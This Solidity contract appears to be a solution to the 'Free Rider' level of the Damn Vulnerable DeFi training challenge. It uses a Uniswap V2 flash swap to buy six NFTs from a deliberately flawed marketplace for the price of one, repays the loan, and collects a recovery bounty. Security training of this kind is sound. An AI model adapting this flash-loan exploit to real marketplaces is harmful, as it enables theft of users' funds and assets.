// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IWETH.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../DamnValuableNFT.sol";

contract FreeRiderAttacker is IUniswapV2Callee, IERC721Receiver {
    FreeRiderNFTMarketplace private immutable i_marketplace;
    FreeRiderRecovery private immutable i_recovery;
    IWETH private immutable i_weth;
    DamnValuableNFT private immutable i_nft;
    address private immutable i_owner;

    constructor(address _nftMarketplace, address _recovery, address _nft, address _weth) payable {
        i_marketplace = FreeRiderNFTMarketplace(payable(_nftMarketplace));
        i_recovery = FreeRiderRecovery(_recovery);
        i_nft = DamnValuableNFT(_nft);
        i_weth = IWETH(_weth);
        i_owner = msg.sender;
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external override {
        // We received WETH but need ETH so we unwrap it
        i_weth.withdraw(15 ether);

        // We buy the NFTs
        uint256[] memory _ids = new uint256[](6);
        _ids[0] = 0;
        _ids[1] = 1;
        _ids[2] = 2;
        _ids[3] = 3;
        _ids[4] = 4;
        _ids[5] = 5;
        i_marketplace.buyMany{value: 15 ether}(_ids);

        // We received back ETH but we need WETH to repay
        i_weth.deposit{value: 15.05 ether}();

        // We repay the loan
        i_weth.transfer(msg.sender, 15.05 ether);

        // We send the NFT to receive the bounty
        i_nft.safeTransferFrom(address(this), address(i_recovery), 0, abi.encode(address(this)));
        i_nft.safeTransferFrom(address(this), address(i_recovery), 1, abi.encode(address(this)));
        i_nft.safeTransferFrom(address(this), address(i_recovery), 2, abi.encode(address(this)));
        i_nft.safeTransferFrom(address(this), address(i_recovery), 3, abi.encode(address(this)));
        i_nft.safeTransferFrom(address(this), address(i_recovery), 4, abi.encode(address(this)));
        i_nft.safeTransferFrom(address(this), address(i_recovery), 5, abi.encode(address(this)));

        // We send the remaining ETH to the owner
        i_owner.call{value: address(this).balance}("");
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory) external override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}
